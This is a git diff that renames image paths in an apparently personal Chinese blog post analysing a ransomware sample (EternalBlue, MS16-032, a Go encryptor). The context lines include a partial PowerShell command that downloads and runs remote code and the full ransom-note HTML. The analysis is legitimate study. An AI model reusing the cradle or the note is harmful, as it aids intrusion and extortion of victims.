@@ -24,7 +24,7 @@ title: Ransomware analysis
 
 
 解压缩，得到如下三个文件。awindows_privedge.exe会启动剩下的两个文件。
-![1-software](/Ransomware analysis/1-software.png)
+![1-software](/Ransomware_analysis/1-software.png)
 
 ## 1、lantools_exp.exe---永恒之蓝
 
@@ -42,7 +42,7 @@ title: Ransomware analysis
 
 查看硬编码的字符串，发现和ms16-032提权漏洞相关的内容。攻击者的目的是以system权限执行其他攻击模块。
 
-![2-ms16-032](/Ransomware analysis/2-ms16-032.png)
+![2-ms16-032](/Ransomware_analysis/2-ms16-032.png)
 
 
 
@@ -62,7 +62,7 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 
 出现如下错误，url解析错误，原来的网址已经无法访问了。
 
-![3-failed](/Ransomware analysis/3-failed.png)
+![3-failed](/Ransomware_analysis/3-failed.png)
 
 
 
@@ -76,7 +76,7 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 
 debug.exe解压缩，得到windbug.exe和debug.bat。
 
-![4-debug](/Ransomware analysis/4-debug.png)
+![4-debug](/Ransomware_analysis/4-debug.png)
 
 debug.bat的内容为：`start C:\Windows\windebug.exe`，而windebug.exe是主要的勒索模块。
 
@@ -86,7 +86,7 @@ ida打开windbug.exe，查看字符串，推断其是由go语言所编写的。
 
 在sub_500CD0()函数中找到了让受害者支付比特币的字符串
 
-![5-pay](/Ransomware analysis/5-pay.png)
+![5-pay](/Ransomware_analysis/5-pay.png)
 
 ```python
 "<html>\n<head>\n<title>\nRecovery your files.\n</title>\n<style type=\"text/css\">\n\t.main {height:auto; width:100%;word-wrap:break-word}\n</style>\n</head>\n<body>\n<font color=#8B0000>\n<b>I am so sorry ! All your files have been encryptd by RSA-1024 and AES-256 due to a computer security problems.</b></br>\n<b>If you think your data is very important .The only way to decrypt your file is to buy my decrytion tool .</b></br>\n<b>else you can delete your encrypted data or reinstall your system.</b></br>\n</br>\n<h2>Your personid :</h2>\n<div class=\"main\">\n<b>ITSSHOWKEY</b></div></br>\n</br>\n</br>\n<h2>Decrytion do as follows:</h2>\n<b>1. if you not own bitcoin,you can buy it online on some websites. like https://localbitcoins.net/ or https://www.coinbase.com/  .</b></br>\n<b>2. send ITSBTC btc to my wallet address ITSADDR.</b></br>\n<b>3. send your btc transfer screenshots and your persionid to my email ITSEMAIL . i will send you decrytion tool.</b></br>\n</br>\n</br>\n<h2>Tips:</h2>\n<b>1.don't rename your file </b></br>\n<b>2.you can try some software to decrytion . but finally you will kown it's vain . </b></br>\n<b>3.if any way can't to contact to me .you can try send me bitcoin and paste your email in the transfer information. i will contact you and send you decrytion tools.</b></br>\n</br>\n</br>\n<b>Anything you want to help . please send mail to my email ITSEMAIL.</b></br>\n<b>Have a nice day . </b>\n</font>\n<body>\n</html>\n",
@@ -114,21 +114,19 @@ All your files have been encryptd by RSA-1024 and AES-256 due to a computer secu
 
 在 sub_503530 中，恶意代码在用户机器上为用户生成 RSA-1024 公私钥pk_user/sk_user，保存在两个全局变量 dword_5F7F50、dword_5F7F54 中。
 
-![6-rsa](/Ransomware analysis/6-rsa.png)
+![6-rsa](/Ransomware_analysis/6-rsa.png)
 
 
 
 RSA2048公钥如下：
 
-![7-rsa_pub](/Ransomware analysis/7-rsa_pub.png)
+![7-rsa_pub](/Ransomware_analysis/7-rsa_pub.png)
 
 更加详细的加密方式可查阅参考文章[1]。
 
 恶意软件整体的流程可查阅参考文章[2]，包括退出当前程序，扫描目录，设置白名单等。
 
 自己目前水平还是太低，没有找到更加详细的分析文章，同时也不具备独立分析的能力，只能理解到这个程度了。还是需要努力学习哇！！
-
-
 
 ## 参考文章
 
